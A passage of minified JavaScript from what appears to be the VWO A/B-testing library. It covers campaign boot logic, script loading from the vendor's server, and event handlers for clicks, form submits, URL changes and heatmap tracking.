      for (const o in t) {
        const i = t[o],
          r = t[o].type;
        if ("FUNNEL" === r || i.ready) continue;
        if (i.manual) continue;
        const s = "SPLIT_URL" === r,
          a = Bo.doExperimentHere(i)[0];
        if (e[o] = {}, e[o].dEH = a, a) {
          if (s) {
            n = window.VWO._.bodyPath + ",";
            break;
          }
          {
            let {
              selector: t,
              selectorPerVariation: r
            } = Wt.getCampaignXPath(i);
            t = t || "", t && (e[o].xpath = {
              selector: t,
              selectorPerVariation: r
            }, n.indexOf(t) > -1 || (n += t + ","));
          }
        }
      }
      n && (n = n.substr(0, n.length - 1), n += Wt.hideElExpression, Wt.insertCSS("_vis_opt_path_hides", n)), window.VWO._.visibilityServiceCache = e, la({
        visibilityServiceCache: e
      }, "vwoInternalProperties");
    },
    wa = function (e) {
      var t, n, o, i;
      return d(this, void 0, void 0, function* () {
        try {
          v("jI"), e._.allSettings.dataStore.vwoData = e._.allSettings.dataStore.vwoData || {};
          const r = e._.allSettings.tags;
          Object.keys(r).forEach(e => {
            r[e].fn = Bt(r[e].fn);
          }), ps(e);
          const s = [];
          let a;
          s.push(null), s.push(Yr.getPhoenixConfig()), window.fetcher.getValue('setVWO("${{1}}")', null, {
            captureGroups: [e]
          }), window.fetcher.setValue("fakeWindow.VWOSettings", s), window.fetcher.setValue("window._vwoCc", window._vwoCc);
          const c = window.VWO._.allSettings.dataStore.CIF;
          if (!window.VWO._.cookies.get("_vwo_uuid") && c) {
            if (a = c(), !a) return;
            window.VWO._.allSettings.dataStore && (window.VWO._.allSettings.dataStore.uuid = a);
          }
          window._vwo_uuid = a || (null === (t = window.VWO._.allSettings.dataStore) || void 0 === t ? void 0 : t.uuid), window.fetcher.setValue("window._vwo_uuid", window._vwo_uuid);
          const [d, l] = Xr();
          e.phoenix = d, Yr.postPhoenixMTHook(), window.VWO._.phoenixMT.trigger("vwo_phoenixInitCalled");
          const u = new Ds();
          if (window._vwo_exp = u.register(re.Object, "_vwo_exp", window._vwo_exp, "", !1), window.VWO._.allSettings.dataStore.campaigns = window._vwo_exp, u.register(re.Document, "cookie"), u.register("custom", "localStorage"), window._vis_debug) {
            const e = Object.keys(window._vwo_exp)[0];
            window._vwo_exp[e].debug.v = Wt.getSelectedVariationForPreviewMode(window._vwo_exp[e]);
          }
          const [w, _] = yield l;
          window.VWO._.phoenixMT.on(Ke.SPA_VISIBILITY_SERVICE, ua), e.data.tB = !0, e.addPhoenix(w), window.vwo_cInstJS && (e._.insightsOnConsentPromise = new Promise(e => {
            window.VWO.phoenix('on("${{1}}", "${{2}}")', null, {
              captureGroups: ["trigger.InsightsOnConsentTrigger", e]
            });
          })), fs(null === (n = e._.ac) || void 0 === n ? void 0 : n.eNC), Zn.init("jslib", e, null), Zn.init("optOut", e, null), window._vwo_surveySettings = u.register(re.Object, "_vwo_surveySettings", window._vwo_surveySettings), window.VWO._.track = u.register(re.Object, "tracklib", window.VWO._.track, "", !1), Js.set("jsLibUtils", {
            verifyUrl: function () {
              return Fo.verifyUrl.apply(Fo, arguments);
            },
            getCleanedUrl: function () {
              return Fo.getCleanedUrl.apply(Fo, arguments);
            }
          }), Wi.register(oa), e.pageGroup = Qs;
          const {
            pages: g,
            pagesEval: p
          } = e._.allSettings;
          e.pageGroup.add(g, p), Pe.init(), window.fetcher.getValue("VWO.modules.vwoUtils.referrer.init"), Zr.finish(), window.VWO._.phoenixMT.trigger("vwo_phoenixInitialized"), window.VwoUnitTestsRunning && (null === (i = (o = window).resolveUnitTestPromise) || void 0 === i || i.call(o));
        } catch (e) {
          window._vwo_code && window._vwo_code.finish(), window.vwo_libExecuted = !0, c.error("Error in bootPhoenix:", e.stack);
        }
      });
    },
    _a = {},
    ga = function (e, t, n) {
      if (!_a[e]) {
        _a[e] = 1;
        var o = document.createElement("script");
        o.src = e, o.type = "text/javascript", t = t || function () {}, n = n || function () {}, o.onerror = function () {
          t();
        }, o.onload = n, document.getElementsByTagName("head")[0].appendChild(o), o.parentNode ? o.parentNode.removeChild(o) : window.setTimeout(function () {
          o.parentNode && o.parentNode.removeChild(o);
        }, 100);
      }
    };
  window.VWO.modules.utils.loadScript = ga;
  const pa = function (e, t) {
    window._vwo_exp = e._.allSettings.dataStore.campaigns, e._.coreLib = {
      lS: ga
    };
    const n = window._vwo_server_url || "https://dev.visualwebsiteoptimizer.com/";
    function o(t) {
      e._.allSettings.triggers.customPreviewTrigger = {
        cnds: ["a", {
          event: Ke.PAGE_VIEW,
          id: +new Date()
        }, {
          event: Ke.VISIBILITY_TRIGGERED,
          id: +new Date()
        }]
      }, e._.allSettings.rules.push({
        triggers: ["customPreviewTrigger"],
        tags: [{
          priority: 4,
          data: `campaigns.${t}`,
          id: "runCampaign"
        }]
      });
      const n = e._.allSettings.dataStore.campaigns[t].triggers[0];
      if (delete e._.allSettings.triggers[n], e._.allSettings.dataStore.campaigns[t].triggers[0] = "customPreviewTrigger", Wt.isPersonalizeCampaign(_vwo_exp[t])) for (const t in e._.allSettings.triggers) {
        const o = e._.allSettings.triggers[t].cnds;
        if (Array.isArray(o)) for (const e of o) (null == e ? void 0 : e.event) && e.event.indexOf(`trigger.${n}`) > -1 && (e.event = "trigger.customPreviewTrigger");
      }
    }
    window._vis_debug || ke() || (e._.allSettings.triggers.vwoExecutedTrigger = {
      cnds: [{
        event: Ke.END_APPLY_CHANGES,
        id: +new Date()
      }]
    }, e._.allSettings.rules.push({
      triggers: ["vwoExecutedTrigger"],
      tags: [{
        priority: 4,
        id: "vwoExecuted"
      }]
    })), window.vwo_cInstJS && (e._.allSettings.tags.ctInsightsOnConsent = {}, e._.allSettings.tags.ctInsightsOnConsent.fn = window.vwo_cInstJS, e._.allSettings.triggers.InsightsOnConsentTrigger = {
      cnds: [{
        event: "vwo_postInit",
        filters: [[["tags.ctInsightsOnConsent"], "exec"]],
        id: +new Date()
      }]
    }), Yr.setFunnelExps();
    const i = e._.allSettings.dataStore.previewExtraSettings;
    if (!i || "object" != typeof i) {
      if (ke()) for (const t in e._.allSettings.dataStore.campaigns) o(t);
      return t(e), !1;
    }
    const r = oe(i);
    if (!r.length) return t(e), !1;
    const s = r[0],
      a = i[s].debug.s,
      d = i[s].debug.tg;
    for (var l in window._vwo_exp) window._vis_debug = !0, window.fetcher.setValue("fakeWindow._vis_debug", window._vis_debug), i[l] ? (_vwo_exp[l].previewHash = i[l].previewHash, _vwo_exp[l].debug = i[l].debug, i[l].debug.url && (_vwo_exp[l].url = decodeURIComponent(i[l].debug.url))) : delete _vwo_exp[l];
    let u;
    ws(window._vwo_exp, i), Object.keys(e._.allSettings.dataStore.campaigns).length || c.error("Preview mode opened but no campaigns served");
    const w = window.name.indexOf("_vis_heatmap_") >= 0 || window._vwo_tm.indexOf("_vis_heatmap_") >= 0;
    var _;
    if (a || w || o(s), _ = s, e._.allSettings.triggers.customSegmentTestTrigger = {
      cnds: [{
        event: "checkSegmentation",
        id: +new Date()
      }]
    }, e._.allSettings.rules.push({
      triggers: ["customSegmentTestTrigger"],
      tags: [{
        data: `campaigns.${_}`,
        id: "segmentEligibilityTest"
      }],
      occurance: 1
    }), e._.allSettings.triggers.customPatternTestTrigger = {
      cnds: [{
        id: +new Date(),
        event: Ke.PAGE_VIEW
      }]
    }, e._.allSettings.rules.push({
      triggers: ["customPatternTestTrigger"],
      tags: [{
        id: "compareUrlAndFireResultantEvent"
      }]
    }), function () {
      e._.allSettings.triggers.customVisibilityServiceTrigger = {
        cnds: ["a", {
          id: +new Date(),
          event: "vwo_groupCampTriggered"
        }, {
          id: +new Date(),
          event: "executePatternMatching"
        }]
      };
      const t = e._.allSettings.rules;
      e._.allSettings.rules = t.map(e => ("visibilityService" === e.tags[0].id && (e.triggers = ["customVisibilityServiceTrigger"]), e));
    }(), !d && !w) {
      const t = window._vwo_exp[s].debug.v;
      e._.allSettings.dataStore.campaigns[s].sections[1].triggers[t] && (e._.allSettings.dataStore.campaigns[s].sections[1].triggers[t] = "customPreviewTrigger");
    }
    if (window._vwo_surveySettings && !a) {
      const e = oe(window._vwo_surveySettings);
      e.length && window._vwo_surveySettings[e[0]].t && (window._vwo_surveySettings[e[0]].t = "customPreviewTrigger");
    }
    if (w) u = `${n}7.0/heatmap.helper.js`, window._vis_opt_heatmap = 1;else {
      if ("SURVEY" === e._.allSettings.dataStore.campaigns[s].type) return window.fetcher.setValue("fakeWindow._vwo_surveySettings", window._vwo_surveySettings), t(e), !0;
      if (window.VWO_d && window.VWO_d.bootDebugger) return t(e), !0;
      u = `${n}7.0/debugger.js`;
    }
    return ga(u, null, function () {
      t(e);
    }), !0;
  };
  class ha {
    constructor() {
      this.id = 0, this.store = {};
    }
    wrap(e, t) {
      const n = this.id++;
      return this.store = this.store || {}, this.store[n] = t ? e.bind(t) : e, n;
    }
    unwrap(e) {
      return this.store[e];
    }
  }
  function va(e, t, n) {
    const o = {};
    return n.forEach(n => {
      var i;
      const [r, s, ...a] = n.condition,
        [c, d] = r.split("."),
        l = "event" === c ? t[d] : De.page[d],
        u = null === (i = Wi.plugins[Mi.OPERATOR]) || void 0 === i ? void 0 : i.get(s),
        w = null == u ? void 0 : u(l, ...a, {
          eventName: e,
          triggerName: n.triggerId
        });
      o[n.triggerName] = o[n.triggerName] || {}, o[n.triggerName][n.condId] = o[n.triggerName][n.condId] || {}, o[n.triggerName][n.condId][n.filterId] = w;
    }), o;
  }
  window.VWO.modules.utils.triggers = {
    triggersConditionsCheck: va
  };
  class fa {
    constructor(e, t, n, o) {
      this.eventName = e, this.domEventName = t, this.domEventsDebounceTime = n, this.attachedFilters = o;
    }
    on(e) {
      this.domEventName !== r.CLICK && this.domEventName !== r.SUBMIT && (this.domEventName === r.DOM_CONTENT_LOADED ? "interactive" === document.readyState || "complete" === document.readyState ? setTimeout(() => {
        e();
      }, 0) : window.document.addEventListener(this.domEventName, this.callback = At(t => {
        t.preComputedConds = va(this.eventName, t, this.attachedFilters), e(t);
      }, this.domEventsDebounceTime), !0) : this.domEventName === r.SCROLL ? window.document.addEventListener(this.domEventName, this.callback = At(t => {
        const {
            scrollY: n,
            innerHeight: o
          } = window,
          i = vwo_$(document).height(),
          r = 100 * n / (i - o);
        Object.assign(t, {
          pxTop: n,
          pxBottom: i - o - n,
          top: r,
          bottom: 100 - r
        }), t.preComputedConds = va(this.eventName, t, this.attachedFilters), e(t);
      }, this.domEventsDebounceTime), !0) : window.document.addEventListener(this.domEventName, this.callback = At(t => {
        t.preComputedConds = va(this.eventName, t, this.attachedFilters), e(t);
      }, this.domEventsDebounceTime), !0));
    }
    off() {
      window.document.removeEventListener(this.domEventName, this.callback, !0);
    }
    eventConditionsUpdate(e) {
      this.attachedFilters = e;
    }
  }
  window.VWO.modules.phoenixPlugins.events.predefinedEvents.GenericDOMEvent = ee.secondary("VWO.modules.phoenixPlugins.events.predefinedEvents.GenericDOMEvent", fa);
  class Ea {}
  class ma extends Ea {
    constructor() {
      super(), this.eventName = n.LEAVE_INTENT, this.threshold = 2, this.delay = 1e3;
    }
    on(e) {
      window.document.addEventListener("mouseout", this.onMouseLeave(e).bind(this)), window.document.addEventListener("mouseover", this.onMouseEnter.bind(this));
    }
    off() {
      window.document.removeEventListener("mouseout", this.mouseLeaveCallback), window.document.removeEventListener("mouseover", this.onMouseEnter);
    }
    onMouseLeave(e) {
      const t = de(window._vwoCc) && window._vwoCc.usrExitLimit || this.delay;
      return this.mouseLeaveCallback = n => {
        Math.abs(n.offsetY || n.clientY) > this.threshold && this.isMouseMoveUpward(n) && (this.timeout = window.setTimeout(() => e(n), t));
      }, this.mouseLeaveCallback;
    }
    onMouseEnter() {
      clearTimeout(this.timeout);
    }
    isMouseMoveUpward(e) {
      let t = !0;
      return /\b(MSIE|Trident.*?rv:|Edge\/)(\d+)/.test(navigator.userAgent) || (t = e.clientY < 0), t && e.screenY - window.innerHeight < 0 && (e.offsetX || e.clientX) - 3 > 0 && e.clientX + 3 - window.innerWidth < 0;
    }
  }
  window.VWO.modules.phoenixPlugins.events.predefinedEvents.LeaveIntentEvent = ee.secondary("VWO.modules.phoenixPlugins.events.predefinedEvents.LeaveIntentEvent", ma);
  class Oa extends Ea {
    constructor(e) {
      super(), this.eventName = n.URL_CHANGE, this.originalCallbacks = {}, this.enableSpaVisibility = 694901 === window._vwo_acc_id, this.events = e || ["pushState", "replaceState", "hashchange", "popstate"];
    }
    on(e) {
      this.lastExecutedURL = window.location.href, this.events.forEach(t => {
        "popstate" === t ? window.addEventListener(t, t => {
          const n = window.location.href;
          this.lastExecutedURL !== n && (window.VWO._.phoenixMT.trigger("vwo_reRun"), this.lastExecutedURL = n, window._vis_opt_url = void 0, e({
            _event: Wt.filterEventObjectForWT(t),
            location: {
              href: window.location.href,
              search: window.location.search,
              hash: window.location.hash
            }
          }), this.enableSpaVisibility && window.VWO._.phoenixMT.trigger(Ke.SPA_VISIBILITY_SERVICE), window.VWO._.phoenixMT.trigger("vwo_urlChangeMt"));
        }, !1) : (this.originalCallbacks[t] = window.history[t], window.history[t] = (...n) => {
          window._vis_opt_url = void 0, this.originalCallbacks[t].apply(window.history, n);
          const o = window.location.href;
          this.lastExecutedURL !== o && (window.VWO._.phoenixMT.trigger("vwo_reRun"), this.lastExecutedURL = o, e({
            values: n,
            location: {
              href: window.location.href,
              search: window.location.search,
              hash: window.location.hash
            }
          }), this.enableSpaVisibility && window.VWO._.phoenixMT.trigger(Ke.SPA_VISIBILITY_SERVICE), window.VWO._.phoenixMT.trigger("vwo_urlChangeMt"));
        });
      });
    }
    off() {
      Object.keys(this.originalCallbacks).forEach(e => {
        window.history[e] = this.originalCallbacks[e];
      });
    }
  }
  window.VWO.modules.phoenixPlugins.events.predefinedEvents.UrlChangeEvent = ee.secondary("VWO.modules.phoenixPlugins.events.predefinedEvents.UrlChangeEvent", Oa);
  class Sa {}
  class Ta extends Sa {
    shouldWeTriggerMetric({
      currentUrl: e
    }, t, n, o = {}) {
      const i = t.isFirst,
        {
          excludeUrl: r,
          pExcludeUrl: s,
          urlRegex: a,
          pUrl: c
        } = n;
      let d;
      d = !(r || s || a || c) || Pr.isGoalEligible(n, e);
      return !(!Wt.isSessionBasedCampaign2(t) && i && o.name === Ke.PAGE_VIEW && "CUSTOM_GOAL" === n.type) && d;
    }
  }
  var Ca = new Ta();
  class ya {
    constructor() {
      this.cacheBfClick = {};
    }
    initiate(e) {
      const t = this,
        n = e.closest("form");
      if (n) {
        const o = t.computeStateCache();
        n.addEventListener("input", function e() {
          t.end(n, e);
        }), this.targetClicked = e, this.cacheBfClick = o;
      }
    }
    computeStateCache() {
      let e = {};
      const t = window._vwo_exp;
      return Object.keys(t).forEach(n => {
        const o = t[n];
        e[n] = o.ready;
      }), e;
    }
    end(e, t) {
      this.cacheBfClick = {}, this.targetClicked = this.submitter = null, e && t && e.removeEventListener("input", t);
    }
    didCampConvertInBetween(e) {
      const t = e.id;
      return this.cacheBfClick[t] !== e.ready;
    }
    updateCache(e) {
      this.submitter = e;
    }
    isFinished() {
      return 0 === Object.keys(this.cacheBfClick).length || this.submitter !== this.targetClicked;
    }
  }
  const Ia = new ya();
  class Aa {
    constructor(e, t) {
      this.nameInStorage = e, this.goalsFilter = t;
    }
    isGoalTriggerValid(e) {
      if (!e) return !0;
      let t = !1;
      const n = Object.keys(e);
      for (const o of n) {
        const n = e[o];
        let i = !0;
        const r = Object.keys(n);
        for (const e of r) if (!n[e]) {
          i = !1;
          break;
        }
        if (i) {
          t = !0;
          break;
        }
      }
      return t;
    }
    fireEventForConversion(e, t) {
      if (!xt.shouldWeTrackVisitor()) return;
      const n = [],
        o = window._vis_opt_url || window.location.href,
        i = Eo(null, e, t);
      return window.VWO._.goalsToBeConvertedSynchronously || Wt.updateGoalsKind(window._vwo_exp), Object.keys(window.VWO._.goalsToBeConvertedSynchronously).forEach(i => {
        var r, s;
        const a = window.VWO._.goalsToBeConvertedSynchronously[i],
          c = window._vwo_exp[i];
        if ("vwo_dom_submit" === e && !Ia.isFinished() && Ia.didCampConvertInBetween(c)) return;
        if ((null === (r = null == c ? void 0 : c.ss) || void 0 === r ? void 0 : r.csa) && !c.isTriggerValidated) return;
        const d = Wt.isSessionBasedCampaign2(c);
        (d && !(null === (s = window.VWO._.track) || void 0 === s ? void 0 : s.loaded) || Bo.getCombi(c)) && Wt.shouldTrackUserForCampaign(c) && Object.entries(a).forEach(([e, i]) => {
          var r, s;
          const a = Object.assign({
            kind: i
          }, c.goals[e]);
          if (this.goalsFilter.includes(a.kind)) {
            const i = null === (r = c.mt) || void 0 === r ? void 0 : r[e];
            if (!i || !this.isGoalTriggerValid(t.preComputedConds[i]) || !Ca.shouldWeTriggerMetric({
              currentUrl: o
            }, c, a)) return;
            if (d && !(null === (s = window.VWO._.track) || void 0 === s ? void 0 : s.loaded)) return void Bo.getCombi(c);
            Bo.isGoalTriggered(c, e) || n.push({
              c: c.id,
              g: e
            });
          }
        });
      }), n.length && Ur(t, n), i;
    }
  }
  window.VWO.modules.utils.goalUtils = {
    GoalConversion: Aa
  };
  class Na {
    static isBrowserChromiumBased() {
      const e = De.navigator.userAgent;
      return !(!e.includes("Chrome/") || !e.includes("Safari/"));
    }
  }
  function ba(e, t) {
    if (e) {
      var n,
        o = "." + e,
        i = window.vwo_$;
      if ((t = t || {})[e]) return !1;
      try {
        n = i(o);
      } catch (e) {
        n = "";
      }
      return 1 === n.length || (t[e] = !0, !1);
    }
  }
  function Va(e) {
    if (e) {
      var t,
        n = window.vwo_$;
      try {
        t = n("#" + e);
      } catch (e) {
        t = "";
      }
      return t.length;
    }
  }
  function Ra(e, t) {
    var n = t[e](),
      o = t.get(0);
    if (!n) {
      if (window.getComputedStyle && void 0 !== (n = getComputedStyle(o)[e]) && (n = parseInt(n, 10), !isNaN(n) && n)) return n;
      n = o["client" + e.toUpperCase()[0] + e.substring(1, e.length)];
    }
    return n;
  }
  function La(e) {
    if (e.previousElementSibling) return e.previousElementSibling;
    for (; e = e.previousSibling;) if (1 === e.nodeType) return e;
  }
  function Pa(e, t) {
    if (!e) return null;
    if (e === document) return "#document";
    t = t || {};
    var n,
      o,
      i,
      r,
      s,
      a = e,
      c = [],
      d = e.tagName,
      l = window.vwo_$;
    if ("string" == typeof d && ("body" === d.toLowerCase() || "head" === d.toLowerCase())) return d;
    for (; e;) {
      n = (d = e.tagName) && d.match(/^((?:[\w\u00c0-\uFFFF\*-]|\\.)+)/), d && n && (n && n[0]) === d || (d = "*");
      const w = ["INPUT", "SELECT"].indexOf(e.tagName) > -1;
      try {
        o = l(e).attr("id");
      } catch (a) {
        o = e.id;
      }
      w && e.name ? d = d + '[name="' + e.name + '"]' : o && "string" == typeof o && Va(o) && (d = d + "#" + o), i = (i = e.getAttribute && e.getAttribute("class")) ? i.split(/\s+/) : [];
      for (var u = 0; u < i.length; u++) if (s = "." + (r = i[u]), ba(r, t)) {
        d += s;
        break;
      }
      c.unshift(d), e = La(e);
    }
    return -1 !== c[0].indexOf("#") || a.parentNode && "HEAD" === a.parentNode.nodeName || (c[0] += ":first-child"), Pa(a.parentNode, t) + " > " + c.join(" + ");
  }
  function Da(e) {
    return e instanceof SVGElement && e.tagName && "svg" !== e.tagName.toLowerCase() ? Da(e.parentNode) : e;
  }
  function xa(e) {
    return Ra("width", e);
  }
  function Ua(e) {
    return Ra("height", e);
  }
  class ka {
    getTargetPathInfo(e) {
      let t, n, o, i, r, s, a, c, d;
      t = vwo_$(e.target), n = t.get(0);
      const l = Da(n);
      return l !== n && (n = l, t = vwo_$(n)), c = Pa(n), "string" != typeof c || "html" === c.toLowerCase() || Wt.isBot2() || (d = t.offset(), "touchend" === e.type ? (r = e.originalEvent && e.originalEvent.changedTouches[0], r && (o = r.pageX, i = r.pageY)) : (o = e.pageX, i = e.pageY), s = Math.round(1e3 * (o - d.left) / xa(t)) / 1e3, a = Math.round(1e3 * (i - d.top) / Ua(t)) / 1e3, (0 > s || 1 < s) && (s = .5), (0 > a || 1 < a) && (a = .5)), "html" === c.toLowerCase() && (c = ""), {
        xpath: c,
        x_percent: s,
        y_percent: a
      };
    }
    evaluateHeatmapData(e) {
      let t,
        n,
        o,
        i,
        r,
        s,
        a,
        c,
        d = {};
      o = vwo_$(e.target), i = o.get(0);
      const l = window._vwo_acc_id,
        u = window._vwo_exp,
        w = Xe(u);
      n = w.length;
      const {
        xpath: _,
        x_percent: g,
        y_percent: p
      } = this.getTargetPathInfo(e);
      for (; n--;) if (r = w[n], t = u[r], "RUNNING" === t.status && t.clickmap && (t.ready || t.gp)) {
        const e = Bo.getCombi(t);
        if (t.clicks = t.clicks || 0, e && _ && ++t.clicks <= (window._vwo_clicks || 3) && Wt.isEligibleToSendCall(r)) {
          c = Wt.getUUID(t), a = "h.gif?experiment_id=" + r + "&account_id=" + l + "&combination=" + e + Wt.getUUIDString(c) + "&url=" + encodeURIComponent(window.location.href) + "&path=" + encodeURIComponent(_) + "&x=" + g + "&y=" + p, window.VWO._.isBeaconAvailable = !0, window.VWO._.isLinkRedirecting = undefined, uo.sendCall({
            serverUrl: De.serverUrl,
            accountId: l
          }, {
            url: a
          }), window.VWO._.isLinkRedirecting = !1, s = s && window.VWO._.isBeaconAvailable, window.VWO.modules.tags.wildCardCallback({
            oldArgs: [r, e, _, g, p]
          }, Ke.HEATMAP_CLICK);
          const n = {
              x: g,
              y: p,
              path: _
            },
            o = "id_" + r;
          d[c] ? d[c] = Object.assign(Object.assign({}, d[c]), {
            [o]: e
          }) : d = Object.assign(Object.assign({}, d), {
            [c]: Object.assign({
              [o]: e
            }, n)
          });
        }
      }
      return d;
    }
  }
  const Wa = new ka();
  window.VWO.modules.utils.heatmapUtils = Wa;
  class Ma {
    constructor(e) {
      this.eventName = n.CLICK_EVENT, this.attachedFilters = e, this.goalConverter = new Aa("vwoClickGoalData", ["CLICK_ELEMENT", "ENGAGEMENT", "ON_PAGE"]);
    }
    shouldTrackClick(e, t) {
      return "touchend" === e || void 0 === t || 1 === t;
    }
    onPointerUp(e, t) {
      var n;
      e.target.vwoPD && (!!(null !== (n = window.chrome) && void 0 !== n ? n : Na.isBrowserChromiumBased()) || !t) && this._click({
        e: e,
        _pause: void 0
      });
    }
    onPointerDown(e) {
      e.target.vwoPD = 1;
    }
    _click({
      _pause: e,
      e: t
    }) {
      var n;
      return d(this, void 0, void 0, function* () {
        let o,
          i,
          r,
          s,
          a,
          c = t.which;
        if (i = vwo_$(t.target), r = i.get(0), Ia.initiate(r), !this.shouldTrackClick(t.type, c) || void 0 === r.tagName) return;
        void 0 === e && (e = 500), "a" === r.tagName.toLowerCase() ? (o = i.attr("href"), s = !0) : 0 < i.parents("a").length ? (o = i.parents("a").eq(0).attr("href"), s = !0) : ("button" === r.tagName.toLowerCase() || 0 < i.parents("button").length || "input" === r.tagName.toLowerCase() && ("button" === i.attr("type") || "image" === i.attr("type") || "submit" === i.attr("type"))) && (s = !0), t.props = t.props || {}, t.userEngagement = t.props.userEngagement = !!s, t.vwoEventName = Ke.DOM_CLICK, o && (t.props.targetUrl = t.targetUrl = o), t.preComputedConds = va(this.eventName, t, this.attachedFilters), a = {
          props: t.props,
          targetUrl: t.targetUrl,
          userEngagement: t.userEngagement,
          vwoEventName: t.vwoEventName,
          preComputedConds: t.preComputedConds
        };
        Wa.evaluateHeatmapData(t);
        this.goalConverter.fireEventForConversion(this.eventName, a);
        let d = (null === (n = a._vwo) || void 0 === n ? void 0 : n.eventDataConfig) || {};
        Object.keys(d).length && (a._vwo = a._vwo || {}, a._vwo.eventDataConfig = d, mo(this.eventName, a));
      });
    }
    syncHeatmapAndEventsData(e, t) {
      const n = {};
      for (const o in t) Object.keys(e).find(e => e === o) && (n[o] = Object.assign(Object.assign({}, t[o]), e[o]), delete t[o]);
      return n;
    }
    on(e, t) {
      const n = this,
        o = ke(),
        i = vwo_$(document)[0];
      o || function () {
        if (i && i.vwoCEvent) return;
        const e = vwo_$(i);
        let o = null,
          r = !1;
        So.addJqEventListener(e, "bind", "pointerdown", e => {
          null !== o && delete o.vwoPD, n.onPointerDown(e), o = e.target, r = !1;
        }, null, t.useCapturePhase), So.addJqEventListener(e, "bind", "pointermove", e => {
          "touch" === e.pointerType && (r = !0);
        }, null, t.useCapturePhase), So.addJqEventListener(e, "bind", "pointerup", e => {
          n.onPointerUp(e, r);
        }, null, t.useCapturePhase), i && (i.vwoCEvent = 1);
      }();
    }
    off() {}
    eventConditionsUpdate(e) {
      this.attachedFilters = e;
    }
    otherSide(...e) {
      throw new Error("entered into outdated otherSide");
    }
  }
  window.VWO.modules.phoenixPlugins.events.predefinedEvents.ClickDomEvent = ee.secondary("VWO.modules.phoenixPlugins.events.predefinedEvents.ClickDomEvent", Ma);
  class Ga {
    constructor(e) {
      this.eventName = Ke.DOM_SUBMIT, this.attachedFilters = e, this.goalConverter = new Aa("vwoSubmitGoalData", ["FORM_SUBMIT"]);
    }
    eventConditionsUpdate(e) {
      this.attachedFilters = e;
    }
    otherSide(...e) {
      throw new Error("entered into outdated otherSide");
    }
    onFormSubmit({
      e: e,
      partialGetters: t
    }) {
      var n,
        o,
        i = vwo_$(e.target),
        r = i.get(0);
      if (Ia.updateCache(e.submitter), "string" == typeof r.tagName && "form" !== r.tagName.toLowerCase() && i.parents("form").length > 0 && (r = i.parents("form").get(0)), "string" == typeof r.tagName && "form" !== r.tagName.toLowerCase() || "vwo_form" === vwo_$(r).attr("id")) return;
      e.props = e.props || {}, e.props.targetUrl = e.targetUrl = vwo_$(r).attr("action"), e.userEngagement = e.props.userEngagement = !0, e.isBeaconAvailable = !0, e.isLinkRedirecting = !0, e.vwoEventName = this.eventName, e.preComputedConds = va(this.eventName, e, this.attachedFilters), o = {
        props: e.props,
        targetUrl: e.targetUrl,
        userEngagement: e.userEngagement,
        isBeaconAvailable: e.isBeaconAvailable,
        isLinkRedirecting: e.isLinkRedirecting,
        vwoEventName: e.vwoEventName,
        preComputedConds: e.preComputedConds
      }, this.goalConverter.fireEventForConversion(this.eventName, o);
      const s = (null === (n = o._vwo) || void 0 === n ? void 0 : n.eventDataConfig) || {};
      Object.keys(s).length && mo(this.eventName, o), Ia.end();
    }
    on(e, t) {
      const n = this,
        o = ke(),
        i = vwo_$(document)[0];
      i && (i.vwoFEvent = 1), function () {
        var e = vwo_$(document)[0];
        o || (So.addJqEventListener(vwo_$(e), "bind", "submit", e => {
          n.onFormSubmit({
            e: e,
            partialGetters: t
          });
        }, null, t.useCapturePhase), e && (e.vwoFEvent = 1));
      }();
    }
    off() {}
  }
  window.VWO.modules.phoenixPlugins.events.predefinedEvents.SubmitDomEvent = ee.secondary("VWO.modules.phoenixPlugins.events.predefinedEvents.SubmitDomEvent", Ga);
  class $a extends Ea {
    constructor() {
      super(...arguments), this.eventName = n.PAGE_LOAD_EVENT;
    }
    on(e) {
      if ("complete" === document.readyState) e();else {
        const t = this.onPageLoad(e);
        window.addEventListener("load", e => {
          t(Wt.filterEventObjectForWT(e));
        }, !0);
      }
    }
    off() {
      window.removeEventListener("load", e => {
        this.pageLoadCallback(Wt.filterEventObjectForWT(e));
      }, !0);
    }
    onPageLoad(e) {
      return this.pageLoadCallback = e, this.pageLoadCallback;
    }
  }
  function Fa(e) {
    var t, n, o, i, r, s, a, d;
    try {
      if (null === (t = window.VWO) || void 0 === t ? void 0 : t.phoenix) return;
      if (!e) return console.warn("VWO aborted as jQuery is not initialized!"), void (null === (n = window._vwo_code) || void 0 === n || n.finish());
      if (window.VWO._.bodyPath = 803786 === window._vwo_acc_id ? ":root body" : "body", !window._vwo_code && !(null === (r = null === (i = null === (o = window.VWO._.allSettings.dataStore) || void 0 === o ? void 0 : o.plugins) || void 0 === i ? void 0 : i.DACDNCONFIG) || void 0 === r ? void 0 : r.PRTHD)) {
        const e = document.createElement("style");
        let t = "";
        (window._vwo_acc_id > 742099 || 718480 === window._vwo_acc_id) && (t = "-webkit-transform:none;-ms-transform:none;transform:none;");
        const n = window.VWO._.bodyPath + "{opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important;" + t + "}",
          o = document.getElementsByTagName("head")[0];
        e.setAttribute("id", "_vis_opt_path_hides"), e.setAttribute("type", "text/css"), e.styleSheet ? e.styleSheet.cssText = n : e.appendChild(document.createTextNode(n)), o.appendChild(e);
      }
      window._removeVwoGlobalStyle = (null === (s = window._vwo_code) || void 0 === s ? void 0 : s.finish) || Wt.removeGlobalStyle, window.VWO.nonce = "";
      const l = document.querySelector("#vwoCode");
      l && (window.VWO.nonce = l.nonce), window.vwo_$ = e, window.clearTimeout(window._vwo_library_timer);
      let u = !!(window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver);
      window.Zone && window.Zone.__symbol__ && (u = !!window[window.Zone.__symbol__("MutationObserver")]);
      const w = window.name.indexOf("_vis_heatmap_") >= 0 || window._vwo_tm.indexOf("_vis_heatmap_") >= 0;
      window.functionWrapper = new ha();
      const _ = {
        MutationObserver: u,
        name: window.name,
        navigator: {
          userAgent: window.navigator.userAgent,
          language: window.navigator.language || window.navigator.browserLanguage,
          appVersion: window.navigator.appVersion
        },
        screen: {
          colorDepth: window.screen.colorDepth,
          pixelDepth: window.screen.pixelDepth
        },
        location: window.location,
        Document: {
          prototype: {}
        },
        localStorage: window.localStorage,
        cachedSettingsInSessionStorage: Wt.syncCachedSettingsInSessionStorage(),
        history: {},
        vwoCodeEndBeforeVA: null === (a = window._vwo_code) || void 0 === a ? void 0 : a.finished(),
        _vwo_code: window._vwo_code,
        _vwo_code_version: (null === (d = window._vwo_code) || void 0 === d ? void 0 : d.getVersion) && window._vwo_code.getVersion(),
        _vwo_server_url: window._vwo_server_url,
        _vwo_acc_id: window._vwo_acc_id,
        _vwo_clicks: window._vwo_clicks,
